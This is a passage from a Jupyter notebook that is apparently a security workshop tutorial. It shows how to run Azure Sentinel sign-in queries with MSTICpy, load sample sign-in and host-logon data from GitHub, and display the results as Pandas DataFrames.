          "output_type": "stream",
          "text": "Query:  list_all_signins_geo\nData source:  LogAnalytics\nGets Signin data used by morph charts\n\nParameters\n----------\nadd_query_items: str (optional)\n    Additional query clauses\nend: datetime (optional)\n    Query end time\nstart: datetime (optional)\n    Query start time\n    (default value is: -5)\ntable: str (optional)\n    Table name\n    (default value is: SigninLogs)\nQuery:\n {table} | where TimeGenerated >= datetime({start}) | where TimeGenerated <= datetime({end}) | extend Result = iif(ResultType==0, \"Sucess\", \"Failed\") | extend Latitude = tostring(parse_json(tostring(LocationDetails.geoCoordinates)).latitude) | extend Longitude = tostring(parse_json(tostring(LocationDetails.geoCoordinates)).longitude)\n",
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "You can then run the query by calling it with the required parameters:"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "from datetime import datetime, timedelta\n# set our query end time as now\nend = datetime.now()\n# set our query start time as 1 hour ago\nstart = end - timedelta(hours=1)\n# run query with specified start and end times\nlogons_df = qry_prov.Azure.list_all_signins_geo(start=start, end=end)\n# display first 5 rows of any results\nlogons_df.head() # If you have no data you will just see the column headings displayed",
      "execution_count": 21,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "try {IPython.notebook.kernel.reconnect();} catch(err) {;}",
            "text/plain": "<IPython.core.display.Javascript object>"
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "execution_count": 21,
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TenantId</th>\n      <th>SourceSystem</th>\n      <th>TimeGenerated</th>\n      <th>ResourceId</th>\n      <th>OperationName</th>\n      <th>OperationVersion</th>\n      <th>Category</th>\n      <th>ResultType</th>\n      <th>ResultSignature</th>\n      <th>ResultDescription</th>\n      <th>DurationMs</th>\n      <th>CorrelationId</th>\n      <th>Resource</th>\n      <th>ResourceGroup</th>\n      <th>ResourceProvider</th>\n      <th>Identity</th>\n      <th>Level</th>\n      <th>Location</th>\n      <th>AlternateSignInName</th>\n      <th>AppDisplayName</th>\n      <th>AppId</th>\n      <th>AuthenticationDetails</th>\n      <th>AuthenticationMethodsUsed</th>\n      <th>AuthenticationProcessingDetails</th>\n      <th>AuthenticationRequirement</th>\n      <th>...</th>\n      <th>NetworkLocationDetails</th>\n      <th>OriginalRequestId</th>\n      <th>ProcessingTimeInMilliseconds</th>\n      <th>RiskDetail</th>\n      <th>RiskEventTypes</th>\n      <th>RiskEventTypes_V2</th>\n      <th>RiskLevelAggregated</th>\n      <th>RiskLevelDuringSignIn</th>\n      <th>RiskState</th>\n      <th>ResourceDisplayName</th>\n      <th>ResourceIdentity</th>\n      <th>ServicePrincipalId</th>\n      <th>ServicePrincipalName</th>\n      <th>Status</th>\n      <th>TokenIssuerName</th>\n      <th>TokenIssuerType</th>\n      <th>UserAgent</th>\n      <th>UserDisplayName</th>\n      <th>UserId</th>\n      <th>UserPrincipalName</th>\n      <th>AADTenantId</th>\n      <th>Type</th>\n      <th>Result</th>\n      <th>Latitude</th>\n      <th>Longitude</th>\n    </tr>\n  </thead>\n  <tbody>\n  </tbody>\n</table>\n<p>0 rows × 62 columns</p>\n</div>",
            "text/plain": "Empty DataFrame\nColumns: [TenantId, SourceSystem, TimeGenerated, ResourceId, OperationName, OperationVersion, Category, ResultType, ResultSignature, ResultDescription, DurationMs, CorrelationId, Resource, ResourceGroup, ResourceProvider, Identity, Level, Location, AlternateSignInName, AppDisplayName, AppId, AuthenticationDetails, AuthenticationMethodsUsed, AuthenticationProcessingDetails, AuthenticationRequirement, AuthenticationRequirementPolicies, ClientAppUsed, ConditionalAccessPolicies, ConditionalAccessStatus, CreatedDateTime, DeviceDetail, IsInteractive, Id, IPAddress, IsRisky, LocationDetails, MfaDetail, NetworkLocationDetails, OriginalRequestId, ProcessingTimeInMilliseconds, RiskDetail, RiskEventTypes, RiskEventTypes_V2, RiskLevelAggregated, RiskLevelDuringSignIn, RiskState, ResourceDisplayName, ResourceIdentity, ServicePrincipalId, ServicePrincipalName, Status, TokenIssuerName, TokenIssuerType, UserAgent, UserDisplayName, UserId, UserPrincipalName, AADTenantId, Type, Result, Latitude, Longitude]\nIndex: []\n\n[0 rows x 62 columns]"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "Another way to run queries is to pass a string format of a KQL query to the query provider, this will run the query against the workspace connected to above, and will return the data in a [Pandas DataFrame](https://pandas.pydata.org/). We will look at working with Pandas in a bit more detail later."
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "# Define our query\ntest_query = \"\"\"\nSigninLogs\n| where TimeGenerated > ago(7d)\n| take 10\n\"\"\"\n\n# Pass that query to our QueryProvider\ntest_df = qry_prov.exec_query(test_query)\n\n# Check that we have some data\nif isinstance(test_df, pd.DataFrame) and not test_df.empty:\n    # .head() returns the first 5 rows of our results DataFrame\n    display(test_df.head())\n# If where is no data load some sample data to use instead\nelse:\n    md(\"You don't appear to have any SigninLogs - we will load sample data for you to use.\")\n    if not Path(\"nbdemo/data/aad_logons.pkl\").exists():\n        Path(\"nbdemo/data/\").mkdir(parents=True, exist_ok=True)\n        urlretrieve('https://github.com/solliancenet/security-workshop/blob/master/artifacts/aad_logons.pkl?raw=true', 'nbdemo/data/aad_logons.pkl')\n        urlretrieve('https://raw.githubusercontent.com/solliancenet/security-workshop/master/artifacts/queries.yaml', 'nbdemo/data/queries.yaml')\n    qry_prov = QueryProvider(\"LocalData\", data_paths=[\"nbdemo/data/\"], query_paths=[\"nbdemo/data/\"])\n    logons_df = qry_prov.Azure.list_all_signins_geo()\n    display(logons_df.head())",
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<p style=''>You don't appear to have any SigninLogs - we will load sample data for you to use.</p>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TenantId</th>\n      <th>SourceSystem</th>\n      <th>TimeGenerated</th>\n      <th>ResourceId</th>\n      <th>OperationName</th>\n      <th>OperationVersion</th>\n      <th>Category</th>\n      <th>ResultType</th>\n      <th>ResultSignature</th>\n      <th>ResultDescription</th>\n      <th>DurationMs</th>\n      <th>CorrelationId</th>\n      <th>Resource</th>\n      <th>ResourceGroup</th>\n      <th>ResourceProvider</th>\n      <th>Identity</th>\n      <th>Level</th>\n      <th>Location</th>\n      <th>AlternateSignInName</th>\n      <th>AppDisplayName</th>\n      <th>AppId</th>\n      <th>AuthenticationDetails</th>\n      <th>AuthenticationMethodsUsed</th>\n      <th>AuthenticationProcessingDetails</th>\n      <th>AuthenticationRequirement</th>\n      <th>...</th>\n      <th>NetworkLocationDetails</th>\n      <th>OriginalRequestId</th>\n      <th>ProcessingTimeInMilliseconds</th>\n      <th>RiskDetail</th>\n      <th>RiskEventTypes</th>\n      <th>RiskEventTypes_V2</th>\n      <th>RiskLevelAggregated</th>\n      <th>RiskLevelDuringSignIn</th>\n      <th>RiskState</th>\n      <th>ResourceDisplayName</th>\n      <th>ResourceIdentity</th>\n      <th>ServicePrincipalId</th>\n      <th>ServicePrincipalName</th>\n      <th>Status</th>\n      <th>TokenIssuerName</th>\n      <th>TokenIssuerType</th>\n      <th>UserAgent</th>\n      <th>UserDisplayName</th>\n      <th>UserId</th>\n      <th>UserPrincipalName</th>\n      <th>AADTenantId</th>\n      <th>Type</th>\n      <th>Result</th>\n      <th>Latitude</th>\n      <th>Longitude</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>2</th>\n      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n      <td>Azure AD</td>\n      <td>2020-05-20 18:19:04.423</td>\n      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n      <td>Sign-in activity</td>\n      <td>1.0</td>\n      <td>SignInLogs</td>\n      <td>0</td>\n      <td>None</td>\n      <td></td>\n      <td>0</td>\n      <td>c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380</td>\n      <td>Microsoft.aadiam</td>\n      <td>Microsoft.aadiam</td>\n      <td></td>\n      <td>CTFUser3</td>\n      <td>4</td>\n      <td>US</td>\n      <td></td>\n      <td>Azure Portal</td>\n      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n      <td>[]</td>\n      <td></td>\n      <td>[]</td>\n      <td>singleFactorAuthentication</td>\n      <td>...</td>\n      <td>[]</td>\n      <td>f05079ed-f820-4531-ab26-498b53af3800</td>\n      <td>366</td>\n      <td>none</td>\n      <td>[]</td>\n      <td>[]</td>\n      <td>none</td>\n      <td>none</td>\n      <td>none</td>\n      <td>Windows Azure Service Management API</td>\n      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n      <td></td>\n      <td></td>\n      <td>{'errorCode': 0}</td>\n      <td></td>\n      <td>AzureAD</td>\n      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n      <td>CTFUser3</td>\n      <td>acc49186-e946-4f6c-85af-669807da0e0f</td>\n      <td>ctfuser3@seccxp.ninja</td>\n      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n      <td>SigninLogs</td>\n      <td>Sucess</td>\n      <td>42.997181</td>\n      <td>-86.848312</td>\n    </tr>\n    <tr>\n      <th>3</th>\n      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n      <td>Azure AD</td>\n      <td>2020-05-20 18:32:44.827</td>\n      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n      <td>Sign-in activity</td>\n      <td>1.0</td>\n      <td>SignInLogs</td>\n      <td>0</td>\n      <td>None</td>\n      <td></td>\n      <td>0</td>\n      <td>d5ef0f81-318f-4881-8df1-8415aab77d1a</td>\n      <td>Microsoft.aadiam</td>\n      <td>Microsoft.aadiam</td>\n      <td></td>\n      <td>Zack Von</td>\n      <td>4</td>\n      <td>US</td>\n      <td></td>\n      <td>Azure Portal</td>\n      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n      <td>[]</td>\n      <td></td>\n      <td>[]</td>\n      <td></td>\n      <td>...</td>\n      <td>[]</td>\n      <td>121dca00-0930-40fe-9b69-bbc1e33c3500</td>\n      <td>394</td>\n      <td>none</td>\n      <td>[]</td>\n      <td></td>\n      <td>none</td>\n      <td>none</td>\n      <td>none</td>\n      <td>Windows Azure Service Management API</td>\n      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n      <td></td>\n      <td></td>\n      <td>{'errorCode': 0}</td>\n      <td></td>\n      <td>AzureAD</td>\n      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n      <td>Zack Von</td>\n      <td>2566a1a6-4d03-40d2-8836-6c8cf1ce517f</td>\n      <td>zvon@seccxp.ninja</td>\n      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n      <td>SigninLogs</td>\n      <td>Sucess</td>\n      <td>48.614380</td>\n      <td>-121.110313</td>\n    </tr>\n    <tr>\n      <th>9</th>\n      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n      <td>Azure AD</td>\n      <td>2020-05-20 18:32:44.827</td>\n      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n      <td>Sign-in activity</td>\n      <td>1.0</td>\n      <td>SignInLogs</td>\n      <td>0</td>\n      <td>None</td>\n      <td></td>\n      <td>0</td>\n      <td>d5ef0f81-318f-4881-8df1-8415aab77d1a</td>\n      <td>Microsoft.aadiam</td>\n      <td>Microsoft.aadiam</td>\n      <td></td>\n      <td>Zack Von</td>\n      <td>4</td>\n      <td>US</td>\n      <td></td>\n      <td>Azure Portal</td>\n      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n      <td>[]</td>\n      <td></td>\n      <td>[]</td>\n      <td>singleFactorAuthentication</td>\n      <td>...</td>\n      <td>[]</td>\n      <td>121dca00-0930-40fe-9b69-bbc1e33c3500</td>\n      <td>394</td>\n      <td>none</td>\n      <td>[]</td>\n      <td>[]</td>\n      <td>none</td>\n      <td>none</td>\n      <td>none</td>\n      <td>Windows Azure Service Management API</td>\n      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n      <td></td>\n      <td></td>\n      <td>{'errorCode': 0}</td>\n      <td></td>\n      <td>AzureAD</td>\n      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n      <td>Zack Von</td>\n      <td>2566a1a6-4d03-40d2-8836-6c8cf1ce517f</td>\n      <td>zvon@seccxp.ninja</td>\n      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n      <td>SigninLogs</td>\n      <td>Sucess</td>\n      <td>48.614380</td>\n      <td>-121.110313</td>\n    </tr>\n    <tr>\n      <th>22</th>\n      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n      <td>Azure AD</td>\n      <td>2020-05-20 18:19:04.423</td>\n      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n      <td>Sign-in activity</td>\n      <td>1.0</td>\n      <td>SignInLogs</td>\n      <td>0</td>\n      <td>None</td>\n      <td></td>\n      <td>0</td>\n      <td>c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380</td>\n      <td>Microsoft.aadiam</td>\n      <td>Microsoft.aadiam</td>\n      <td></td>\n      <td>CTFUser3</td>\n      <td>4</td>\n      <td>US</td>\n      <td></td>\n      <td>Azure Portal</td>\n      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n      <td>[]</td>\n      <td></td>\n      <td>[]</td>\n      <td></td>\n      <td>...</td>\n      <td>[]</td>\n      <td>f05079ed-f820-4531-ab26-498b53af3800</td>\n      <td>366</td>\n      <td>none</td>\n      <td>[]</td>\n      <td></td>\n      <td>none</td>\n      <td>none</td>\n      <td>none</td>\n      <td>Windows Azure Service Management API</td>\n      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n      <td></td>\n      <td></td>\n      <td>{'errorCode': 0}</td>\n      <td></td>\n      <td>AzureAD</td>\n      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n      <td>CTFUser3</td>\n      <td>acc49186-e946-4f6c-85af-669807da0e0f</td>\n      <td>ctfuser3@seccxp.ninja</td>\n      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n      <td>SigninLogs</td>\n      <td>Sucess</td>\n      <td>42.997181</td>\n      <td>-86.848312</td>\n    </tr>\n    <tr>\n      <th>37</th>\n      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n      <td>Azure AD</td>\n      <td>2020-05-20 17:05:35.809</td>\n      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n      <td>Sign-in activity</td>\n      <td>1.0</td>\n      <td>SignInLogs</td>\n      <td>0</td>\n      <td>None</td>\n      <td></td>\n      <td>0</td>\n      <td>bf124019-b325-4a4a-81ff-6c2823461620</td>\n      <td>Microsoft.aadiam</td>\n      <td>Microsoft.aadiam</td>\n      <td></td>\n      <td>CTFUser3</td>\n      <td>4</td>\n      <td>US</td>\n      <td></td>\n      <td>Azure Portal</td>\n      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n      <td>[]</td>\n      <td></td>\n      <td>[\\r\\n  {\\r\\n    \"key\": \"Login Hint Present\",\\r\\n    \"value\": \"True\"\\r\\n  }\\r\\n]</td>\n      <td>singleFactorAuthentication</td>\n      <td>...</td>\n      <td>[]</td>\n      <td>39f36cc7-ad3e-430c-bf78-bc96fbc33300</td>\n      <td>553</td>\n      <td>none</td>\n      <td>[]</td>\n      <td>[]</td>\n      <td>none</td>\n      <td>none</td>\n      <td>none</td>\n      <td>Windows Azure Service Management API</td>\n      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n      <td></td>\n      <td></td>\n      <td>{'errorCode': 0}</td>\n      <td></td>\n      <td>AzureAD</td>\n      <td>Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safa...</td>\n      <td>CTFUser3</td>\n      <td>acc49186-e946-4f6c-85af-669807da0e0f</td>\n      <td>ctfuser3@seccxp.ninja</td>\n      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n      <td>SigninLogs</td>\n      <td>Sucess</td>\n      <td>41.465630</td>\n      <td>-73.610718</td>\n    </tr>\n  </tbody>\n</table>\n<p>5 rows × 62 columns</p>\n</div>",
            "text/plain": "                                TenantId SourceSystem           TimeGenerated  \\\n2   ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD 2020-05-20 18:19:04.423   \n3   ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD 2020-05-20 18:32:44.827   \n9   ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD 2020-05-20 18:32:44.827   \n22  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD 2020-05-20 18:19:04.423   \n37  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD 2020-05-20 17:05:35.809   \n\n                                                                  ResourceId  \\\n2   /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n3   /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n9   /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n22  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n37  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n\n       OperationName OperationVersion    Category ResultType ResultSignature  \\\n2   Sign-in activity              1.0  SignInLogs          0            None   \n3   Sign-in activity              1.0  SignInLogs          0            None   \n9   Sign-in activity              1.0  SignInLogs          0            None   \n22  Sign-in activity              1.0  SignInLogs          0            None   \n37  Sign-in activity              1.0  SignInLogs          0            None   \n\n   ResultDescription  DurationMs                         CorrelationId  \\\n2                              0  c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380   \n3                              0  d5ef0f81-318f-4881-8df1-8415aab77d1a   \n9                              0  d5ef0f81-318f-4881-8df1-8415aab77d1a   \n22                             0  c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380   \n37                             0  bf124019-b325-4a4a-81ff-6c2823461620   \n\n            Resource     ResourceGroup ResourceProvider  Identity Level  \\\n2   Microsoft.aadiam  Microsoft.aadiam                   CTFUser3     4   \n3   Microsoft.aadiam  Microsoft.aadiam                   Zack Von     4   \n9   Microsoft.aadiam  Microsoft.aadiam                   Zack Von     4   \n22  Microsoft.aadiam  Microsoft.aadiam                   CTFUser3     4   \n37  Microsoft.aadiam  Microsoft.aadiam                   CTFUser3     4   \n\n   Location AlternateSignInName AppDisplayName  \\\n2        US                       Azure Portal   \n3        US                       Azure Portal   \n9        US                       Azure Portal   \n22       US                       Azure Portal   \n37       US                       Azure Portal   \n\n                                   AppId AuthenticationDetails  \\\n2   c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n3   c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n9   c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n22  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n37  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n\n   AuthenticationMethodsUsed  \\\n2                              \n3                              \n9                              \n22                             \n37                             \n\n                                                    AuthenticationProcessingDetails  \\\n2                                                                                []   \n3                                                                                []   \n9                                                                                []   \n22                                                                               []   \n37  [\\r\\n  {\\r\\n    \"key\": \"Login Hint Present\",\\r\\n    \"value\": \"True\"\\r\\n  }\\r\\n]   \n\n     AuthenticationRequirement  ... NetworkLocationDetails  \\\n2   singleFactorAuthentication  ...                     []   \n3                               ...                     []   \n9   singleFactorAuthentication  ...                     []   \n22                              ...                     []   \n37  singleFactorAuthentication  ...                     []   \n\n                       OriginalRequestId ProcessingTimeInMilliseconds  \\\n2   f05079ed-f820-4531-ab26-498b53af3800                          366   \n3   121dca00-0930-40fe-9b69-bbc1e33c3500                          394   \n9   121dca00-0930-40fe-9b69-bbc1e33c3500                          394   \n22  f05079ed-f820-4531-ab26-498b53af3800                          366   \n37  39f36cc7-ad3e-430c-bf78-bc96fbc33300                          553   \n\n   RiskDetail RiskEventTypes RiskEventTypes_V2  RiskLevelAggregated  \\\n2        none             []                []                 none   \n3        none             []                                   none   \n9        none             []                []                 none   \n22       none             []                                   none   \n37       none             []                []                 none   \n\n   RiskLevelDuringSignIn RiskState                   ResourceDisplayName  \\\n2                   none      none  Windows Azure Service Management API   \n3                   none      none  Windows Azure Service Management API   \n9                   none      none  Windows Azure Service Management API   \n22                  none      none  Windows Azure Service Management API   \n37                  none      none  Windows Azure Service Management API   \n\n                        ResourceIdentity ServicePrincipalId  \\\n2   797f4846-ba00-4fd7-ba43-dac1f8f63013                      \n3   797f4846-ba00-4fd7-ba43-dac1f8f63013                      \n9   797f4846-ba00-4fd7-ba43-dac1f8f63013                      \n22  797f4846-ba00-4fd7-ba43-dac1f8f63013                      \n37  797f4846-ba00-4fd7-ba43-dac1f8f63013                      \n\n   ServicePrincipalName            Status TokenIssuerName TokenIssuerType  \\\n2                        {'errorCode': 0}                         AzureAD   \n3                        {'errorCode': 0}                         AzureAD   \n9                        {'errorCode': 0}                         AzureAD   \n22                       {'errorCode': 0}                         AzureAD   \n37                       {'errorCode': 0}                         AzureAD   \n\n                                                                                              UserAgent  \\\n2   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n3   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n9   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n22  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...   \n37  Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safa...   \n\n   UserDisplayName                                UserId  \\\n2         CTFUser3  acc49186-e946-4f6c-85af-669807da0e0f   \n3         Zack Von  2566a1a6-4d03-40d2-8836-6c8cf1ce517f   \n9         Zack Von  2566a1a6-4d03-40d2-8836-6c8cf1ce517f   \n22        CTFUser3  acc49186-e946-4f6c-85af-669807da0e0f   \n37        CTFUser3  acc49186-e946-4f6c-85af-669807da0e0f   \n\n        UserPrincipalName                           AADTenantId        Type  \\\n2   ctfuser3@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n3       zvon@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n9       zvon@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n22  ctfuser3@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n37  ctfuser3@seccxp.ninja  4b2462a4-bbee-495a-a0e1-f23ae524cc9c  SigninLogs   \n\n    Result   Latitude   Longitude  \n2   Sucess  42.997181  -86.848312  \n3   Sucess  48.614380 -121.110313  \n9   Sucess  48.614380 -121.110313  \n22  Sucess  42.997181  -86.848312  \n37  Sucess  41.465630  -73.610718  \n\n[5 rows x 62 columns]"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "### Learn more:\n - You can learn more about the MSTICpy pre-defined queries in the [MSTICpy Documentation](https://msticpy.readthedocs.io/en/latest/data_acquisition/DataProviders.html#running-an-pre-defined-query)"
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "---\n## Pandas\nOur query results are returned in the form of a Pandas DataFrame. DataFrames are a core component of the Azure Sentinel notebooks and of MSTICpy and is used for both input and output formats.\nPandas DataFrames are incredibly versitile data structures with a lot of useful features, we will cover a small number of them here and we recommend that you check out the Learn more section to learn more about Pandas features.\n<br>\n<br>\n### Displaying a DataFrame:\nThe first thing we want to do is display our DataFrame. You can either just run it or explicity display it by calling `display(df)`."
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "# For this section we are going to create a DataFrame from data we have saved in a csv file\ndf = pd.read_csv(\"https://raw.githubusercontent.com/solliancenet/security-workshop/master/artifacts/host_logins.csv\", index_col=[0] )\n# Display our DataFrame\ndf  # or display(df)",
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "execute_result",
          "execution_count": 33,
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TenantId</th>\n      <th>Account</th>\n      <th>EventID</th>\n      <th>TimeGenerated</th>\n      <th>SourceComputerId</th>\n      <th>Computer</th>\n      <th>SubjectUserName</th>\n      <th>SubjectDomainName</th>\n      <th>SubjectUserSid</th>\n      <th>TargetUserName</th>\n      <th>TargetDomainName</th>\n      <th>TargetUserSid</th>\n      <th>TargetLogonId</th>\n      <th>LogonProcessName</th>\n      <th>LogonType</th>\n      <th>AuthenticationPackageName</th>\n      <th>Status</th>\n      <th>IpAddress</th>\n      <th>WorkstationName</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:02.980</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>MSTICAdmin</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n      <td>0xfaac27</td>\n      <td>Advapi</td>\n      <td>4</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>203.160.71.100</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:04.503</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>203.160.71.100</td>\n      <td>-</td>\n    </tr>\n    <tr>\n      <th>2</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\adm1nistrator</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:06.363</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>-</td>\n      <td>-</td>\n      <td>S-1-0-0</td>\n      <td>adm1nistrator</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-1066</td>\n      <td>0xfb5ee6</td>\n      <td>NtLmSsp</td>\n      <td>3</td>\n      <td>NTLM</td>\n      <td>NaN</td>\n      <td>fe80::38dc:e4a9:61bd:b458</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>3</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:10.813</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>SYSTEM</td>\n      <td>NT AUTHORITY</td>\n      <td>S-1-5-18</td>\n      <td>0x3e7</td>\n      <td>Advapi</td>\n      <td>5</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>203.160.71.100</td>\n      <td>-</td>\n    </tr>\n    